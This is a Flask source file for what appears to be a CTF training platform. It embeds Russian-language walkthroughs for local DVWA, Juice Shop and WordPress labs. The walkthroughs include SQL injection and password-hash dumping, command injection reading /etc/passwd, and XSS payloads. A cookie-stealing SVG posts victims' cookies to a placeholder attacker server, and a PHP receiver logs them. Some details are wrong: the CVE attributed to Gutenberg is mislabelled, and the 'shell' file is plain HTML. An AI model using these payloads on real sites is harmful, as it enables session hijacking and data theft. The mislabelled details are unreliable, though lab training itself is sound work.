"""Основной Blueprint: главная, дашборд, приём флагов."""

from flask import Blueprint, render_template, request, jsonify
from flask_login import login_required, current_user

from .models import FlagFound
from . import db
from .utils import lookup_flag, total_flags
from flask import render_template


bp = Blueprint("main", __name__)

LABS_INFO = [
    {
        "name": "dvwa",
    "description": "Damn Vulnerable Web Application — учебный сервис с уязвимостями.",
    "url": "http://localhost:8080",
    "port": 8080,
    "instruction": """
        <p><strong>DVWA Security</strong><br>Уровень: low</p>

        <h5>1. Раздел: SQL Injection</h5>
        <ul>
            <li>Введи: <code>1' OR '1'='1</code><br>Вывод: список всех пользователей из БД</li>
            <li>Введи: <code>' UNION SELECT user, password FROM users -- </code><br>Вывод: извлечение хешей всех паролей</li>
            <li>Расшифруй пароли через: CrackStation, MD5Decrypt, HashKiller</li>
        </ul>

        <h5>2. Раздел: Command Injection</h5>
        <ul>
            <li>Введи: <code>8.8.8.8; uname -a</code><br>Вывод: Имя пользователя ОС</li>
            <li>Введи: <code>1 | ls -l</code><br>Вывод: Список файлов и прав</li>
            <li>Введи: <code>1 | uname -a & pwd & ps</code><br>Вывод: Информация об ОС и местоположении</li>
            <li>Введи: <code>1 | cat /etc/passwd</code><br>Вывод: Логины из системы</li>
        </ul>

        <h5>3. Раздел: XSS (DOM)</h5>
        <ul>
            <li>Выбери язык, затем в адресной строке замени параметр на: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
            <li>Вывод: Исполнение вредоносного кода</li>
        </ul>

        <h5>4. Раздел: File Upload</h5>
        <ul>
            <li>Создай файл <code>shell.php</code> с содержимым:</li>
        </ul>

<pre><code>&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Page Title&lt;/title&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="initial-scale=1.0"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;center&gt;Shell Executed&lt;/center&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

        <ul>
            <li>Загрузи файл через уязвимую форму загрузки</li>
            <li>Перейди по адресу: <code>http://localhost:8080/hackable/uploads/shell.php</code></li>
            <li>Вывод: Shell был выполнен на сервере</li>
            <li>Для инструкций к более высокой сложности воспользуйтесь ссылкой:</li>
            <li>https://timcore.ru/2021/05/11/41-ujazvimost-dvwa-sql-injection-blind-uroven-low/</li>
        </ul>
            
        """,
    },
    {
        "name": "juice-shop",
        "description": "OWASP Juice Shop — современный уязвимый веб-магазин.",
        "url": "http://localhost:3000",
        "port": 3000,
        "instruction": """
            <p>Juice Shop — тренажёр с множеством уязвимостей.</p>
            <ul>
              <li>Вход: нет обязательной регистрации</li>
              <li>Цель: найти и сдать флаги через форму.</li>
            </ul>
        """,
    },

    {
        "name": "wordpress:5.0",
    "description": "WordPress 5.0 — платформа с уязвимостью загрузки SVG и XSS через редактор Gutenberg.",
    "url": "http://localhost:8085",
    "port": 8085,
    "instruction": """
        <h5>1. RCE через Gutenberg (CVE-2019-6977)</h5>
        <p><strong>Суть:</strong> Возможность загрузки вредоносных SVG-файлов через редактор записей.</p>
        <ul>
            <li>Войдите в систему как <strong>администратор</strong>.</li>
            <li>Перейдите в меню: <em>Записи → Добавить новую</em></li>
            <li>Вставьте следующий SVG-код в заголовок поста:</li>
        </ul>

<pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"&gt;&lt;/svg&gt;
</code></pre>

        <ul>
            <li>Опубликуйте пост.</li>
            <li>При открытии страницы выполнится XSS-скрипт.</li>
        </ul>

        <h5>2. Кража cookies через SVG</h5>
        <p><strong>Сценарий атаки:</strong> Вредоносный SVG собирает cookies и отправляет их злоумышленнику.</p>

        <ul>
            <li>Войдите как администратор и создайте новую запись.</li>
            <li>Вставьте следующий код в заголовок:</li>
        </ul>

<pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
  &lt;script&gt;
    const cookies = document.cookie;
    const url = window.location.href;
    const data = new FormData();
    data.append('cookies', cookies);
    data.append('url', url);

    fetch('https://ваш-сервер.com/steal', {
      method: 'POST',
      body: data,
      mode: 'no-cors'
    }).then(() =&gt; {
      alert('Ошибка загрузки изображения!');
    });
  &lt;/script&gt;
  &lt;rect width="100%" height="100%" fill="white"/&gt;
&lt;/svg&gt;
</code></pre>

        <p>На вашем сервере создайте файл <code>steal.php</code> для приёма данных:</p>

<pre><code>&lt;?php
$data = [
    'ip' =&gt; $_SERVER['REMOTE_ADDR'],
    'time' =&gt; date('Y-m-d H:i:s'),
    'cookies' =&gt; $_POST['cookies'],
    'url' =&gt; $_POST['url']
];
file_put_contents('stolen.txt', print_r($data, true), FILE_APPEND);
?&gt;
</code></pre>

        <ul>
            <li>После публикации поста при открытии произойдёт передача куков и URL на внешний сервер.</li>
            <li>Пользователю отобразится ложное сообщение об ошибке.</li>
        </ul>
        """,
    },

    # Добавь остальные сервисы по аналогии...
]
@bp.route("/videos")
@login_required  # если нужна авторизация, или убери если нет
def videos():
    return render_template("videos.html")

@bp.route("/quests")
@login_required
def quests():
    return render_template("quest.html", labs=LABS_INFO)

@bp.route("/instructions")
@login_required
def instructions():
    return render_template("instructions.html", labs=LABS_INFO)
@bp.route("/")
def index():
    return render_template("index.html")


@bp.route("/dashboard")
@login_required
def dashboard():
    flags = current_user.flags
    progress = current_user.progress(total_flags())
    total=total_flags()
    return render_template("dashboard.html", flags=flags, progress=progress,total_flags=total)


@bp.route("/submit_flag", methods=["POST"])
@login_required
def submit_flag():
    flag_text = request.form.get("flag", "").strip()
    if not flag_text:
        return jsonify(status="error", message="Флаг пустой"), 400

    found = lookup_flag(flag_text)
    if not found:
        return jsonify(status="error", message="Неверный флаг"), 400

    # Проверяем, сдавался ли ранее
    if FlagFound.query.filter_by(user_id=current_user.id, flag=flag_text).first():
        return jsonify(status="error", message="Уже засчитан"), 400

    ff = FlagFound(user_id=current_user.id,
                   flag=found.flag,
                   lab_name=found.service,
                   flag_type=found.flag_type)
    db.session.add(ff)
    db.session.commit()

    return jsonify(status="success", message=f"Принято: {found.service}/{found.flag_type}")
